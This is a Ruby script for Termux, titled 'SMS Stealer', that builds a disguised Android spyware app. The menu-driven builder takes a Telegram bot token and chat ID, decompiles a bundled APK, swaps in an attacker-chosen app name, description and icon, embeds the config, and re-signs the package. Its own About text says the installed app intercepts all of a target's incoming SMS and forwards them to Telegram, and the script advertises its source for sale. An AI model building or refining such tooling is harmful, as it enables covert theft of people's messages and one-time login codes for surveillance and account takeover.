#!/data/data/com.termux/files/usr/bin/ruby

require 'fileutils'
require 'json'

# Bright / bold colors only – no dim, no faint
RESET = "\e[0m"
BOLD = "\e[1m"
RED = "\e[31m"
GREEN = "\e[32m"
YELLOW = "\e[33m"
BLUE = "\e[34m"
MAGENTA = "\e[35m"
CYAN = "\e[36m"
WHITE = "\e[37m"

def colorize(text, color)
  "#{color}#{text}#{RESET}"
end

def clear
  system("clear")
end

def msf_banner
  banner_text = <<~BANNER
  #{CYAN}        This guy is a heretic and#{RESET}
  #{CYAN}          should be flamed at once.#{RESET}
  #{CYAN}                      /#{RESET}
  #{CYAN}                     /#{RESET}
  #{CYAN}            )            (#{RESET}
  #{CYAN}           /(   (\\___/)  )\\#{RESET}
  #{CYAN}          ( #)  \\ (''')| ( ##{RESET}
  #{CYAN}           ||___c\\  > '__||#{RESET}
  #{CYAN}           ||**** ),_/ **'|#{RESET}
  #{CYAN}     .__   |'* ___| |___*'|#{RESET}
  #{CYAN}      \\_\\  |' (    ~   ,)'|#{RESET}
  #{CYAN}       ((  |' /(.  '  .)\\ |#{RESET}
  #{CYAN}        \\\\_|_/ <_ _____> \\______________#{RESET}
  #{CYAN}         /   '-, \\   / ,-'      ______  \\#{RESET}
  #{CYAN} b'ger   /      (//   \\\\)     __/     /   \\#{RESET}
  #{CYAN}                            './_____/#{RESET}
  BANNER
  puts colorize(banner_text, CYAN)
  puts colorize("       =[ SMS Stealer v0.1.0 - by Alienkrishn ]=", BOLD + YELLOW)
  puts colorize("+ -- --=[ Android SMS forwarder with Telegram bot", BOLD + WHITE)
  puts
end

def show_menu
  clear
  msf_banner
  puts colorize("  [1] Start        - Build & sign APK", GREEN)
  puts colorize("  [2] Config       - Set bot token, chat ID", GREEN)
  puts colorize("  [3] About        - Tool info", GREEN)
  puts colorize("  [4] Buy Source   - Contact Alienkrishn", GREEN)
  puts colorize("  [0] Exit         - Quit", RED)
  puts
  print colorize("sms-stealer > ", BOLD + CYAN)
end

def press_enter
  print colorize("\nPress Enter to return to menu...", YELLOW)
  gets
end

def about
  puts colorize("\n+ -- --=[ About SMS Stealer", BOLD + BLUE)
  puts colorize("| Name       : sms-stealer", WHITE)
  puts colorize("| Language   : Ruby", WHITE)
  puts colorize("| Author     : #{colorize('Alienkrishn', MAGENTA)} [Anon4you]", WHITE)
  puts colorize("| Version    : 0.1.0", WHITE)
  puts colorize("| Description:", CYAN)
  puts colorize("|   Builds an Android app with a", CYAN)
  puts colorize("|   custom WebView and a Telegram bot.", CYAN)
  puts colorize("|   Installed on a target device,", CYAN)
  puts colorize("|   it intercepts all incoming SMS", CYAN)
  puts colorize("|   and forwards them to Telegram.", CYAN)
  press_enter
end

def config
  config_file = "assets/smsstealer.json"

  if File.exist?(config_file)
    print colorize("Config exists. Overwrite? [y/N]: ", YELLOW)
    ans = gets.chomp.downcase
    unless ans == "y"
      puts colorize("Config unchanged.", YELLOW)
      press_enter
      return
    end
  end

  puts colorize("\n+ -- --=[ Configuration", BOLD + CYAN)
  print colorize("| Web URL (default https://www.google.com): ", CYAN)
  web_url = gets.chomp
  web_url = "https://www.google.com" if web_url.empty?

  print colorize("| Telegram Bot Token: ", CYAN)
  bot_token = gets.chomp
  if bot_token.empty?
    puts colorize("| [!] Bot token required.", RED)
    press_enter
    return
  end

  print colorize("| Telegram Chat ID: ", CYAN)
  chat_id = gets.chomp
  if chat_id.empty?
    puts colorize("| [!] Chat ID required.", RED)
    press_enter
    return
  end

  data = {
    "webview_url" => web_url,
    "bot_token" => bot_token,
    "chat_id" => chat_id
  }

  File.write(config_file, JSON.pretty_generate(data))
  puts colorize("| [+] Config saved to #{config_file}", GREEN)
  press_enter
end

def buy_source
  puts colorize("\n[+] Opening Telegram with inquiry...", CYAN)
  system("xdg-open 'https://t.me/alienkrishn?text=i%20wanna%20buy%20sms-stealer%20source%20code'")
  press_enter
end

def start
  config_file = "assets/smsstealer.json"
  unless File.exist?(config_file)
    puts colorize("\n[!] smsstealer.json not found. Run 'config' first.", RED)
    press_enter
    return
  end

  # Create $HOME/sms-stealer directory if it doesn't exist
  output_dir = File.expand_path("~/sms-stealer")
  FileUtils.mkdir_p(output_dir)

  puts colorize("\n+ -- --=[ APK Builder", BOLD + GREEN)
  print colorize("| App name: ", GREEN)
  app_name = gets.chomp

  print colorize("| Description: ", GREEN)
  description = gets.chomp

  icon_path = nil
  loop do
    print colorize("| App icon (path/to/.png): ", GREEN)
    icon_path = gets.chomp
    if icon_path.end_with?(".png") && File.exist?(icon_path)
      break
    else
      puts colorize("| [!] Must be an existing .png file.", RED)
    end
  end

  # Keystore generation
  keystore_dir = "assets/key"
  keystore_path = File.join(keystore_dir, "sms-stealer.keystore")
  unless File.exist?(keystore_path)
    puts colorize("| [*] Generating keystore...", CYAN)
    FileUtils.mkdir_p(keystore_dir)
    cmd = "keytool -genkey -v -keystore \"#{keystore_path}\" -alias \"sms-stealer\" -keyalg RSA -keysize 2048 -validity 10000 -storepass \"sms-stealer\" -keypass \"sms-stealer\" -dname \"CN=alienkrishn, OU=alienkrishn, O=alienkrishn, L=Unknown, ST=Unknown, C=IN\""
    system("#{cmd} > /dev/null 2>&1")
    puts colorize("| [+] Keystore created.", GREEN)
  end

  # Decompile
  puts colorize("| [*] Decompiling assets/app.apk to ./ss ...", CYAN)
  system("apkeditor d -i assets/app.apk -o ss")

  # Replace strings
  strings_file = "ss/resources/package_1/res/values/strings.xml"
  if File.exist?(strings_file)
    puts colorize("| [*] Replacing placeholders in strings.xml...", CYAN)
    content = File.read(strings_file)
    content.gsub!("sms-stealer", app_name)
    content.gsub!("YOUR_MSG_TXT", description)
    File.write(strings_file, content)
  else
    puts colorize("| [!] strings.xml not found. Aborting.", RED)
    press_enter
    return
  end

  # Copy config as myinfo.json
  target_assets = "ss/root/assets"
  target_json = File.join(target_assets, "myinfo.json")
  puts colorize("| [*] Copying smsstealer.json to assets...", CYAN)
  FileUtils.mkdir_p(target_assets)
  FileUtils.cp(config_file, target_json)

  # Copy icon
  drawable_dir = "ss/resources/package_1/res/drawable"
  target_icon = File.join(drawable_dir, "icon.png")
  FileUtils.mkdir_p(drawable_dir)
  FileUtils.cp(icon_path, target_icon)
  puts colorize("| [+] Icon copied.", GREEN)

  # Build unsigned APK
  temp_apk = "#{app_name}.apk"
  puts colorize("| [*] Building unsigned APK: #{temp_apk}", CYAN)
  system("apkeditor b -i ss -o \"#{temp_apk}\"")

  # Sign
  unsigned_apk = "#{temp_apk}.unsigned"
  FileUtils.mv(temp_apk, unsigned_apk) if File.exist?(temp_apk)
  puts colorize("| [*] Signing APK...", CYAN)
  sign_cmd = "apksigner sign --ks \"#{keystore_path}\" --ks-pass pass:sms-stealer --ks-key-alias sms-stealer --key-pass pass:sms-stealer --out \"#{temp_apk}\" \"#{unsigned_apk}\""
  system(sign_cmd)

  # Final output path inside $HOME/sms-stealer
  final_apk = File.join(output_dir, "#{app_name}.apk")

  if File.exist?(temp_apk)
    # Avoid "same file" error when temp_apk is already in output_dir
    temp_abs = File.absolute_path(temp_apk)
    final_abs = File.absolute_path(final_apk)
    if temp_abs != final_abs
      FileUtils.mv(temp_apk, final_apk)
    end
    FileUtils.rm_f(unsigned_apk)
    idsig = "#{temp_apk}.idsig"
    FileUtils.rm_f(idsig) if File.exist?(idsig)
    puts colorize("| [+] APK signed and placed at #{final_apk}", GREEN)
  else
    puts colorize("| [!] Signing failed. Keeping unsigned APK.", RED)
    if File.exist?(unsigned_apk)
      uns_abs = File.absolute_path(unsigned_apk)
      final_abs = File.absolute_path(final_apk)
      if uns_abs != final_abs
        FileUtils.mv(unsigned_apk, final_apk)
      end
    end
  end

  # Cleanup
  FileUtils.rm_rf("ss")
  puts colorize("| [+] Removed ./ss", GREEN)

  puts colorize("\n+ -- --=[ FINISHED", BOLD + GREEN)
  puts colorize("| Output APK: #{final_apk}", BOLD + WHITE)
  puts colorize("\n[+] APK is ready. Exiting.", YELLOW)
  exit(0)
end

# Main loop
loop do
  show_menu
  choice = gets.chomp

  case choice
  when "1"
    start
  when "2"
    config
  when "3"
    about
  when "4"
    buy_source
  when "0"
    puts colorize("\nExiting. Goodbye!", YELLOW)
    break
  else
    puts colorize("\n[!] Invalid choice. Enter 0-4.", RED)
    press_enter
  end
end
